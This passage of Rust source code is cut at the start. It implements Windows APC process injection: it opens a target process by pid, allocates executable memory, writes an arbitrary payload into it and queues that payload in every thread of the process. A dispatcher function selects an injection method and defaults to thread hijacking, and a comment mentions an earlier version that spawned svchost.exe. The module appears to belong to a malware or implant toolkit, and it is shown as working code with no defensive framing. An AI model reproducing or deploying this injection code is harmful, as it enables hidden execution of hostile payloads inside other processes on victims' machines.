    //  4. Queuing the APC routine to each thread (they will fire when
    //     that thread next enters an alertable wait state).
    // The original implementation incorrectly spawned a *new* svchost.exe
    // instead of injecting into the supplied `pid`.
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
        THREAD_SET_CONTEXT,
    };

    unsafe {
        let hprocess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 0, pid);
        if hprocess.is_null() {
            return Err(anyhow::anyhow!(
                "apc_inject: OpenProcess(pid={}) failed: {}",
                pid,
                std::io::Error::last_os_error()
            ));
        }

        let remote_mem = VirtualAllocEx(
            hprocess,
            std::ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_mem.is_null() {
            CloseHandle(hprocess);
            return Err(anyhow::anyhow!(
                "apc_inject: VirtualAllocEx(pid={}) failed",
                pid
            ));
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            hprocess,
            remote_mem,
            payload.as_ptr() as _,
            payload.len(),
            &mut written,
        ) == 0
        {
            CloseHandle(hprocess);
            return Err(anyhow::anyhow!(
                "apc_inject: WriteProcessMemory(pid={}) failed",
                pid
            ));
        }
        CloseHandle(hprocess);

        // Snapshot all threads in the system, filter by owner pid, queue APC.
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Err(anyhow::anyhow!(
                "apc_inject: CreateToolhelp32Snapshot failed"
            ));
        }

        let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        let mut queued = 0u32;
        if Thread32First(snapshot, &mut entry) != 0 {
            loop {
                if entry.th32OwnerProcessID == pid {
                    let hthread = OpenThread(THREAD_SET_CONTEXT, 0, entry.th32ThreadID);
                    if !hthread.is_null() {
                        if QueueUserAPC(apc_routine, hthread, 0) != 0 {
                            queued += 1;
                        }
                        CloseHandle(hthread);
                    }
                }
                if Thread32Next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);

        if queued == 0 {
            return Err(anyhow::anyhow!(
                "apc_inject: no threads found in pid={} to queue APC into",
                pid
            ));
        }

        tracing::info!(
            "apc_inject: queued APC in {} thread(s) of pid {}",
            queued,
            pid
        );
        Ok(())
    }
}

#[cfg(windows)]
use crate::injection::InjectionMethod;

#[cfg(windows)]
pub fn select_and_inject(
    pid: u32,
    payload: &[u8],
    method: Option<InjectionMethod>,
) -> anyhow::Result<()> {
    let method = method.unwrap_or(InjectionMethod::ThreadHijack);
    log::info!("Dispatching injection using method: {:?}", method);
    crate::injection::inject_with_method(method, pid, payload)
}
